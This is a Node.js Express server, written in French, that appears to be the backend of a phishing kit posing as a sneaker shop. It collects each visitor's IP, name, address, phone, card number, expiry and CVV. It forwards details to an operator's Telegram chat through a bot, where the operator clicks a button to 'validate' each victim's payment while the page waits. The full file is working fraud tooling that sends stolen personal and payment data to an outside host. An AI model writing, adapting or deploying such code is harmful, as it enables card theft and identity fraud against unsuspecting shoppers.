require('dotenv').config();
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, '../public')));
app.use(express.json());

const sessions = {};

function generateSessionId() {
  return crypto.randomBytes(16).toString('hex');
}

async function sendTelegramNotification(sessionId) {
  const data = sessions[sessionId];
  if (!data) return;

  let message = '🆕 *Nouvelle interaction*\n\n';
  if (data.ip) message += `🏠 IP : \`${data.ip}\`\n`;
  if (data.pair) message += `👟 Paire : \`${data.pair}\`\n`;
  if (data.delivery) {
    const d = data.delivery;
    message += `📦 Livraison : ${d.nom} ${d.prenom}\n`;
    message += `📍 Adresse : ${d.adresse}\n`;
    message += `📞 Téléphone : ${d.telephone}\n`;
  }
  if (data.payment) {
    const p = data.payment;
    message += `💳 Carte : \`${p.number.slice(-4)}\`\n`;
    message += `📅 Exp : ${p.expiry}\n`;
  }
  if (data.validated) {
    message += `\n✅ *Paiement validé par l'admin*`;
  }

  const inlineKeyboard = data.validated
    ? []
    : [[{ text: '✅ Valider paiement', callback_data: 'validate_' + sessionId }]];

  const payload = {
    chat_id: process.env.CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: inlineKeyboard }
  };

  try {
    if (!data.messageId) {
      const res = await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, payload);
      sessions[sessionId].messageId = res.data.result.message_id;
    } else {
      await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/editMessageText`, {
        chat_id: process.env.CHAT_ID,
        message_id: data.messageId,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: inlineKeyboard }
      });
    }
  } catch (err) {
    console.error('Erreur Telegram:', err.message);
  }
}

app.get('/api/visit', (req, res) => {
  const sessionId = generateSessionId();
  sessions[sessionId] = { ip: req.ip || req.connection.remoteAddress || 'inconnue' };
  res.json({ sessionId });
});

app.post('/api/pair', async (req, res) => {
  const { sessionId, pair } = req.body;
  if (sessions[sessionId]) {
    sessions[sessionId].pair = pair;
    await sendTelegramNotification(sessionId);
  }
  res.sendStatus(200);
});

app.post('/api/delivery', async (req, res) => {
  const { sessionId, nom, prenom, adresse, telephone } = req.body;
  if (sessions[sessionId]) {
    sessions[sessionId].delivery = { nom, prenom, adresse, telephone };
    await sendTelegramNotification(sessionId);
  }
  res.sendStatus(200);
});

app.post('/api/payment', async (req, res) => {
  const { sessionId, number, expiry, cvv } = req.body;
  if (sessions[sessionId]) {
    sessions[sessionId].payment = { number, expiry, cvv };
    await sendTelegramNotification(sessionId);
  }
  res.sendStatus(200);
});

app.get('/api/status', (req, res) => {
  const sessionId = req.query.session;
  const session = sessions[sessionId];
  res.json({ status: session?.validated ? 'validated' : 'pending' });
});

app.post('/telegram-webhook', async (req, res) => {
  const update = req.body;
  if (update.callback_query) {
    const { data } = update.callback_query;
    if (data.startsWith('validate_')) {
      const sessionId = data.split('_')[1];
      if (sessions[sessionId]) {
        sessions[sessionId].validated = true;
        await sendTelegramNotification(sessionId);
      }
      await axios.post(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: update.callback_query.id
      });
    }
  }
  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(`✅ Serveur démarré sur le port ${PORT}`);
  console.log(`🔗 Webhook Telegram : ${process.env.BASE_URL || 'http://localhost:' + PORT}/telegram-webhook`);
});
